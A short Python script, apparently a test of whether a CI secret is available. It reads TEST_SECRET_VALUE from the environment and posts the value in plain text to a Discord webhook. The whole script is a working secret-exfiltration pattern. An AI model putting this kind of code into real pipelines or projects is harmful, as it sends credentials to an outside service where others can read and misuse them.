import os
import requests

test_secret_value = os.getenv('TEST_SECRET_VALUE')
WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK_URL')

def main():
    if test_secret_value:
        print("Secret value exists")
        try:
            payload = {
                "content": f"Secret value found: {test_secret_value}"
            }
            response = requests.post(WEBHOOK_URL, json=payload)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            print(f"Error sending to Discord: {e}")

main()

